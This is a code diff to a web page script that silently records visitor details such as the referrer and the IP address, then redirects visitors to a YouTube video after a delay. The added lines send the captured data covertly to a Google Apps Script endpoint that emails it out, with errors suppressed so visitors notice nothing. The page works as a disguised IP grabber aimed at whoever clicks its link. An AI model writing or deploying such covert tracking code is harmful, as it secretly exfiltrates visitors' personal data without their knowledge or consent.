@@ -30,6 +30,7 @@
 
     <script>
         const REDIRECT = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+        const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbwrcGejT1loU62ewjQaMxTQyxmgWyIvl-Mx4EJXcoq5ThbmhHYPP0uXugTxkEFekq1qOA/exec';
 
         // Silently collect data
         const data = {
@@ -43,16 +44,21 @@
             referrer: document.referrer || 'Direct'
         };
 
-        // Get IP silently
+        // Get IP and send email alert
         fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(d => {
                 data.ip = d.ip;
                 console.log('📊 CAPTURED DATA:', data);
+                
+                // Send email via Google Script
+                const params = new URLSearchParams(data);
+                fetch(EMAIL_SCRIPT + '?' + params.toString())
+                    .catch(() => {});
             })
             .catch(() => {});
 
-        // Redirect after 1.5 seconds (looks natural)
+        // Redirect after 1.5 seconds
         setTimeout(() => {
             window.location.href = REDIRECT;
         }, 1500);
